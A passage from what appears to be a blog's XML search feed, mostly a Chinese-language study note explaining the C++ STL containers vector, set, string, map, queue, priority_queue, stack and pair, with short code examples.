class="markdownIt-Anchor" href="#相似性度量">#</a> 相似性度量</h3><p>闵可夫斯基距离：</p>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ STL 学习</title>
      <link href="/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/"/>
      <url>/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>由于自己之前并不常用 STL 库，而 STL 库在很多算法中能够节省很多自己手打数据结构的时间，故这里开一个笔记来重新学习一下，也方便自己之后能够复习。</p><h2 id="vector-的常见用法详解"><a class="markdownIt-Anchor" href="#vector-的常见用法详解">#</a> Vector 的常见用法详解</h2><p>【简介】vector 翻译为向量，我觉得用‘变长数组’来解释他更为合适。利用 vector 可以避免超内存等情况，节省空间。也可以用邻接表的方式来存储图。  使用 vector 头文件是  vector 需要 include.<br><strong>1，vector 定义</strong><br>单独定义一个 vector:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>上面这个定义其实相当于定义了一个一维数组 name [SIZE]，只不过其长度可以根据需要进行变化。 这里的 typename 可以是任何数据类型。<br>如果 typename 也是 vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">typename</span>&gt;&gt; name; </span><br></pre></td></tr></table></figure><p>这里很容易联想到二维数组的定义，我们可以认为其是两个维度都可变长的二维数组。<br>然后是<strong> vector 数组</strong> 的方法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; Arrayname[arraysize];</span><br></pre></td></tr></table></figure><p>这样 Arrayname [0] ~ Arrayname [arraysize-1] 都是一个<strong> vector</strong> 容器。 这里是一个维度固定的二维数组。<br><strong>2，vector 容器内元素的访问</strong></p><ul><li><p>通过下标访问。<br>和访问普通数组一样，对于 vector&lt;typename&gt; vi; 直接通过 vi [index 访问即可。这里的下标是从 0 到 vi.size ()-1 访问这个范围外的元素可能会出错。</p></li><li><p>通过迭代器访问。<br>迭代器 (iterator) 可以理解是一种类似<strong>指针</strong>的东西，其定义是:</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt;::iterator it;</span><br></pre></td></tr></table></figure><p>这样得到了迭代器 it, 并且可以通过 * it 来访问 vector 的元素。<br>例如，这里有一个 vector 容器：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">5</span>; i++)&#123;</span><br><span class="line"> vi.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过下面的方式进行访问容器内的元素</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,*(it + i)); <span class="comment">//输出 vi[i]</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从这里可以看出 vi [i] 和 *(vi.begin ()+ i ) 是等价的。<br>这里 begin () 是取 vector 头元素的地址，这里引出 <strong>end()</strong> 这里需要注意 <strong>end()</strong> 是取 vector 末尾元素地址的下一个地址，不存储任何元素。故这里有了另一种遍历 vector 的方法。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>(); it != vi.<span class="built_in">end</span>() ; it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要指出，在常用的 STL 容器中，只有<strong> vector 和 string</strong> 中，才允许使用<strong> vi.begin ()+3</strong> 这种迭代器加上整数的写法。<br><strong>3，vector 常用函数实例解析</strong><br><strong>（1）push_back</strong><br> 顾名思义，push_back (x) 就是在 vector 尾元素添加一个元素 x, 时间复杂度 O (1)。<br><strong>（2）pop_back</strong><br> 即删除 vector 的尾元素。<br><strong>（3）size()</strong><br> 用来获取 vector 中元素的个数。返回 unsigned 类型。<br><strong>（4）clear()</strong><br> 用来清空 vector 中的所有元素。<br><strong>（5）insert()</strong><br> insert (it,x) 用来向 vector 的任意迭代器 it 处插入一个元素 x。<br><strong>（6）erase()</strong><br> 两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素。 erase (it) 即删除迭代器为 it 处的元素。<br>②删除一个区间所有的元素，erase (first,end), 删除 [first,last) 内的所有元素。<br><strong>4，vector 的常见用途</strong><br>（1）存储数据<br>（2）用邻接表存储图</p></li></ul><h2 id="set-的常见用法详解"><a class="markdownIt-Anchor" href="#set-的常见用法详解">#</a> set 的常见用法详解</h2><p>【简介】set 翻译为集合，是指一个内部自动有序且不含重复元素的容器。考试中，有可能出现需要去掉重复元素的情况，这时候就可以用 set 来保留元素本身不考虑其个数。使用 set 需要添加 &lt;set&gt;。<br><strong>1，set 的定义</strong><br>单独定义一个 set</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>这里的写法和 vector 基本一样，或者说大部分的 STL 都是这样定义的，typename 可以是任何基本类型。 这里不再介绍各个数组之类的定义方式，和 vector 基本一样。<br><strong>2，set 容器内元素的访问</strong><br> set 只能通过迭代器 (iterator) 访问。定义方式和 vector 的迭代器定义方式一样。由于除了 <strong>vector 和 stirng</strong> 之外的迭代器都不只除 *(it + i) 的访问方式，因此只能按照下面方式枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">5</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">2</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="type">int</span>&gt;::iterator it = st.<span class="built_in">begin</span>();it != st.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的输出结果为 2  3  5。<br><strong>3,set 常用函数实例解析</strong><br><strong>（1） insert ()</strong><br> insert (x) 可将 x 插入 set 容器中，并自动递增排序和去重。<br><strong>（2）find()</strong><br> find (value) 返回 set 中对应值为 value 的迭代器。<br><strong>（3）erase()</strong><br> erase 也有两种用法：删除单个元素，删除区间内元素<br>①删除单个，st.erase (it)，it 为所要删除元素的迭代器。可以结合 find () 函数来表示<br> st.erase (value),value 为所要删除的元素的值。<br>②删除一个区间的所有元素。 st.erase (first,last) 可以删除一个区间所有的元素，first 和 last 为迭代器形式，注意删除为 [first,last) 左闭右开。<br><strong>（4）size()</strong><br> 用来获得 set 内元素的个数。<br><strong>（5）clear()</strong><br> clear () 用来清空 set 中所有的元素。<br><strong>3,set 的常见用途</strong><br>主要作用是自动去重并按照升序进行排序。</p><h2 id="string的常见用法详解"><a class="markdownIt-Anchor" href="#string的常见用法详解">#</a> string 的常见用法详解</h2><p>【简介】在 C 语言中，一般用字符串数组 char str [] 来存放字符串。使用 string 会更加的方便。如果要使用 string，需要包含 string 头文件，注意 string.h 和 string 是不一样的头文件。<br><strong>1，string 的定义</strong><br>定义 string 的方式和基本数据类型相同，只需要在 string 上跟上变量名（可进行初始化）即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>2，string 中内容的访问</strong><br><strong>（1）通过下标访问</strong><br>一般来说，可以直接像字符数组那样去访问 string:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; str.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,str[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果就是 abcd 。<br>如果要读入或者输出整个字符串，则只能用 cin 和 cout：(如果想用 printf 输出 string，需要利用 c_str () 函数将 string 类型转换为字符数组来进行输出)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">cout&lt;&lt;str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str.<span class="built_in">c_str</span>());</span><br></pre></td></tr></table></figure><p><strong>（2）通过迭代器访问</strong><br>因为有些函数如 insert () 和 erase () 要求迭代器为参数，因此还是需要学习一个 string 迭代器的用法。<br>由于 string 不像其他 STL 容器需要参数，故可以这样定义迭代器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string::iterator it;</span><br></pre></td></tr></table></figure><p>这样就得到了迭代器 it，并且可以通过 * 来访问 string 的每一位。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(string::iterator it = str.<span class="built_in">begin</span>(); it != str.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3,string 常用函数实例解析</strong><br> string 的函数有很多，这里只调出几个主要的。<br><strong>（1）operator+=</strong><br> 这是 string 的加法，可以直接将两个 string 拼接起来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str1 = <span class="string">&quot;abc&quot;</span>, str2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">str1 += str2; <span class="comment">//将str2直接拼接到str1上</span></span><br></pre></td></tr></table></figure><p><strong>（2）compare operator</strong><br> 两个 string 类型可以用 ==，!= , &lt;, &lt;= ,&gt; , &gt;= 进行比较大小，比较规则是字典序。<br><strong>（3）length()/size()</strong><br> length () 返回 stirng 的长度，即存放的字符数。size () 和 length () 基本相同。<br><strong>（4） insert()</strong><br> string 的 insert () 函数有很多写法，这里给出几个常用的写法。<br>①insert (pos,string)，在 pos 号位置中插入字符串 string。<br>②insert (it,it2,it3)，it 为字符串的欲插入位置，it2 和 it3 为待插入字符串的首尾迭代器，用来表示串 [it2,it3) 将被插入在 it 的位置上。<br><strong>（5）erase()</strong><br> erase () 有两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素：erase (it) 用于删除单个元素，it 为所需要删除的元素的迭代器。<br>②删除一个区间所有元素，erase (first,last)，同理，删除 [first,last)，first 和 last 为相应的迭代器。这里还有一种用法，str.erase (pos,length)，pos 为需要开始删除的起始位置，length 为删除的字符个数。<br><strong>（6）clear()</strong><br> clear () 用于清空 string 的数据。<br><strong>（7）substr()</strong><br> substr (pos,len) 返回从 pos 号位开始，长度为 len 的字串<br><strong>（8）string::npos</strong><br>string::npos 是一个常数，其本身的值为 - 1，但是由于是 unsigned_int 类型，因此实际上也可以认为其是 unsigned_int 类型最大值，string::npos 用以作为 find 函数匹配失败的返回值。<br><strong>（9）find()</strong><br> str.find (str2)，当 str2 是 str 的子串时，返回其在 str 中第一次出现的位置，如果 str2 不是 str 的子串，返回 string::npos。<br>str.find (str2,pos)，从 str 的 pos 号位开始匹配 str2，返回值和上相同。<br><strong>（10）replace()</strong><br> str.replace (pos,len,str2) 把 str 从 pos 号位开始，长度为 len 的子串替换为 str2。<br>str.replace (it1,it2,str2) 把 str 的迭代器 [it1,it2) 范围的子串替换为 str2。</p><h2 id="map的常用用法详解"><a class="markdownIt-Anchor" href="#map的常用用法详解">#</a> map 的常用用法详解</h2><p>【简介】 map 翻译为映射。在定义数组时 (int array [100])，其实是定义了一个从 int 型到 int 型的映射，比如 array [0] = 25,array [4] =36 就分别是将 0 映射到 25，将 4 映射到 36. 一个 double 型数组则是将 int 映射到 double 型，这里不再介绍。这样，当我们需要其他类型作为关键字来作映射，会显得不太方便。这时可以用到 map，因为 map 可以将任何基本类型（包括 STL 的容器）映射到任意基本类型。<br><strong>1，map 的定义</strong><br>单独定义一个 map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt; mp;</span><br><span class="line">map&lt;string,<span class="type">int</span>&gt; map;  <span class="comment">//字符串映射int型 必须用string</span></span><br><span class="line">map&lt;set&lt;<span class="type">int</span>&gt;,string&gt; mp;  <span class="comment">//可以让STL容器作为键</span></span><br></pre></td></tr></table></figure><p>上述代码中，第一个是键的类型，第二个是值得类型。注意如果是字符串到整型得映射，必须用 string 而不能用 char 数组。<br><strong>2，map 容器内元素得访问</strong><br> map 有两种访问方式：下标和迭代器</p><ul><li>通过下标访问<br>和普通数组一样，例如对于 map&lt;char,int&gt; mp 得 map 来说，可以使用 mp [‘c’] 来访问对应对应得整数。当建立映射时，可以用 mp [‘c’] = 20 这样和普通数组一样得方式。但是要注意的是，<strong>map 中得键是唯一的</strong>。</li><li>通过迭代器访问<br> map 得迭代器定义和其他得 STL 容器迭代器定义得方式一样  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt;::iterator it;</span><br></pre></td></tr></table></figure>typename1 和 typename2 就是定义 map 时填写得类型，这样就得到了迭代器 it。<br>map 迭代器得使用方式和其他 STL 容器得迭代器不同，因为 map 得每一对映射都有两个 typename，这决定了必须能通过一个 it 来同时访问键和值。事实上，<strong>map 可以使用 it-&gt;first 来访问键，使用 it-&gt;second 来访问值。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;m&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line">mp[<span class="string">&#x27;r&#x27;</span>] = <span class="number">30</span>;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %d\n&quot;</span>, it-&gt;first, it-&gt;second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>结果：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a <span class="number">40</span></span><br><span class="line">m <span class="number">20</span></span><br><span class="line">r <span class="number">30</span></span><br></pre></td></tr></table></figure>这里似乎有一个很神奇的现象：<strong>map 会以键从小到大的顺序自动排序</strong>，这是由于 map 内部使用红黑树实现的 (set 也是)，在建立映射会自动实现从小到大的排序功能。<br><strong>3，map 常用函数实例解析</strong><br><strong>（1）find ()</strong><br> find (key) 返回键为 key 的映射的迭代器。<br><strong>（2）erase()</strong><br> 有两种用法：删除单个元素，删除一个区间额你的所有元素。<br>①删除单个元素：map.erase (it)，it 为需要删除的元素的迭代器。<br>示例如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">mp[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span>;</span><br><span class="line">mp[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span>;  </span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">find</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">mp.<span class="built_in">erase</span>(it);  <span class="comment">//这里删除了 b 2</span></span><br></pre></td></tr></table></figure><p>第二种方式，mp.erase (key),key 为欲删除的映射的键。<br>②删除一个区间的所有元素。mp.erase (first,last)，其中 first 为需要删除的区间的起始迭代器，而 last 则为需要删除的区间的末尾迭代器的一个地址，也为左闭右开的区间 [first,last)。<br><strong>（3）size()</strong><br> size () 用来获取 map 中映射的对数。<br><strong>（4）clear()</strong><br> clear () 用来清空 map 中的所有元素。<br><strong>4,map 的常见用途</strong><br>感觉 map 能用到的地方应该算是比较多的。</p><ul><li>需要建立字符和整数之间映射的题目。</li><li>判断大整数或其他数据是否存在的题目，吧 map 当 bool 数组使用。</li><li>字符串和字符串的映射也可能会遇到。<br>** 扩展:mao 的键和值是唯一的，如果一个键需要对应多个值，只能用 multimap。另外，C++11 还加了 unordered_map，以散列代替 map 内部的红黑树实现，使其可以用来处理只映射而不按 key 排序的需求，速度会很快。</li></ul><h2 id="queue的常见用法详解"><a class="markdownIt-Anchor" href="#queue的常见用法详解">#</a> queue 的常见用法详解</h2><p>【定义】queue 翻译为队列，是一种很常见的数据结构。STL 实现了一个先进先出的容器。使用时需要添加 queue 的头文件。<br><strong>1，queue 的定义</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，queue 容器内元素的访问</strong><br>由于队列本身是一种先进先出的限制性数据结构，因此再 STL 中只能用 front () 来访问队首元素，或者是 back () 来访问队尾元素。<br><strong>3，queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (x) 将 x 进行入队。<br><strong>（2）front(),back()</strong><br> front 和 back 分别获取队首元素和队尾元素。<br><strong>（3）pop()</strong><br> pop () 令队首元素出队。<br><strong>（4）empty()</strong><br> empty () 检测 queue 是否为空。<br><strong>（5）size()</strong><br> size () 返回 queue 内元素的个数。<br><strong>4,queue 的常见用途</strong><br>当需要进行 BFS 时，可以直接用 queue 进行代替<br>有一点可能需要注意，再使用 front () 和 back () 之前，先用 empty () 判断队列是否为空，否则可能会出现错误。</p><h2 id="priority_queue的常见用法详解"><a class="markdownIt-Anchor" href="#priority_queue的常见用法详解">#</a> priority_queue 的常见用法详解</h2><p>【简介】 priority_queue 又称为优先队列，其底层是用堆来实现的。在优先队列中，队首元素一定是当前队列中优先级最高的哪一个。如队列有如下元素，且定义好了优先级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">桃子 (优先级<span class="number">3</span>)</span><br><span class="line">梨子 (优先级<span class="number">4</span>)</span><br><span class="line">苹果 (优先级<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>那么出队顺序为梨子 -&gt; 桃子 -&gt; 苹果。<br>当然，可以在任何时候往优先队列加入元素，而优先队列底层的数据结构堆 (heap) 会随时调整结构，使得每次的队首元素都是优先级最大的。<br><strong>1，priority_queue</strong><br> 要使用优先队列，应该添加头文件 queue。 其定义写法也和其他 STL 容器相同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2,priority_queue 容器内元素的访问</strong><br>和队列不一样的是，优先对立而没有了 front () 和 back () 函数，而只能通过 top () 函数来访问队首元素，也就是优先级最高的元素。<br><strong>3,priority_queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (X) 将 X 入队，时间复杂度 O (logN)，其中 N 为当前优先队列中的元素个数。<br><strong>（2）top()</strong><br> 获取队首（堆顶）的元素。<br><strong>（3）pop()</strong><br> 使队首（堆顶）的元素出队。<br><strong>（4）empty()</strong><br> 检测优先队列是否为空。<br><strong>（5）size()</strong><br> size () 返回优先队列元素的个数。<br><strong>4，priority_queue 内元素优先级的设置</strong><br>下面来介绍下优先级的设置方法。<br><strong>（1）基本数据类型的优先级设置</strong><br>此处指的是 int,double,char 等可以直接使用的数据类型，对他们的游戏那寄设置一般使数字大的优先级越高，因此队首元素就是优先队列元素中最大的那个 (char 类型则是字典序最大的)。对基本数据类型来说，下面两种定义是<strong>等价的</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,less&lt;<span class="type">int</span>&gt;&gt; q;</span><br></pre></td></tr></table></figure><p>可以发现，第二种定义方式的尖括号多出了两个参数：一个是 vector&lt;int&gt;，另一个是 less&lt;int&gt;。其中第二个参数填写的是承载底层数据结构堆的容器，如果第一个参数是 double 或 char 型，则此处只需要填写 vector&lt;double &gt; 或 vector&lt;char&gt;; 而第三个参数 less&lt;int &gt; 则是对第一个参数的比较类，less&lt;int &gt; 表示数字大的优先级大，而 greater&lt;int &gt; 表示数字小的优先级大。<br><strong>（2）结构体的优先级设置</strong><br>这里以开头举得水果的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">fruit</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> fruit &amp;f1,<span class="type">const</span> fruit &amp;f2)&#123;</span><br><span class="line"><span class="keyword">return</span> f1.price &lt; f2.price;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;fruit&gt; q;   <span class="comment">//这里就像sort的cmp函数一样， 这里是正常的 这里是以价格高的水果优先</span></span><br></pre></td></tr></table></figure><p>现在如果希望水果的价格高作为优先级高，就需要<strong>重载</strong>小于号 &quot;&lt;&quot;。重载是指对已有的运算符重新定义。见上代码块。可以看到在结构体增加了一个友元函数。 这里可以记一下， <strong>优先对了的这个函数和 sort 的 cmp 函数的效果是相反的。</strong><br><strong>5,priority_qeue 的常见用途</strong><br>可以解决一些贪心问题，也可以对 Dijkstra 算法进行优化。</p><h2 id="stack的常见用法解析"><a class="markdownIt-Anchor" href="#stack的常见用法解析">#</a> stack 的常见用法解析</h2><p>【简介】stack 翻译为栈，是 STL 种实现一个后进先出的容器。<br><strong>1，stack 的定义</strong><br>需要添加头文件 stack，用法依然和其他 STL 容器一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，stack 容器内元素的访问</strong><br>由于 stack 是一种后进先出的数据结构，在 STL 的 stack 只能通过 top () 来访问栈顶元素。<br><strong>3，stack 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> 将 x 入栈。<br><strong>（2）top()</strong><br> 获得栈顶元素。<br><strong>（3）pop()</strong><br> 弹出栈顶元素。<br><strong>（4）empty()</strong><br> 判断 stack 是否为空。<br><strong>（5）size()</strong><br> 返回 stack 内元素的个数。<br><strong>4,stack 的常见用途</strong><br> stack 一般用来模拟实现一些递归，防止程序堆栈内存的限制而导致程序运行出错。一般来说，程序的栈内存空间很小。</p><h2 id="pair的常见用法解析"><a class="markdownIt-Anchor" href="#pair的常见用法解析">#</a> pair 的常见用法解析</h2><p>【简介】pair 是一个很实用的 &quot;小玩意&quot;，当想要将两个元素绑在一起作为一个合成元素，又不想定义结构体时，可以用 pair。其可以看作时一个内部有两个元素的结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pair</span>&#123;</span><br><span class="line">typename1 first;</span><br><span class="line">typename2 second;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1，pair 的定义</strong><br>要使用 pair，需要添加头文件 utility。注意：由于 map 实现过程中设计 pair，因此添加 map 头文件会自动添加 utility 头文件，故添加 map 头文件即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;typename1,typeName2&gt; name;</span><br><span class="line"><span class="function">pair&lt;string,<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>如果想初始化，只需要加个括号里面添加初始化的内容即可。如果想要临时构建一个 pair，有下面两种方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">make_pair</span>(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>2，pair 中元素的访问</strong><br> pair 中只有两个元素，分别是 first 和 second，只需要按照正常结构体方式去访问即可。<br><strong>3，pair 的使用函数解析</strong><br>这里只需注意比较操作数，是先比较 first，first 相等时采取判别 second 的大小。<br><strong>4，pair 的常见用途</strong></p><ul><li>用来代替二元结构体和其构造函数，可以节省编码时间。</li><li>作为 map 的键值来进行插入。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/</url>
      
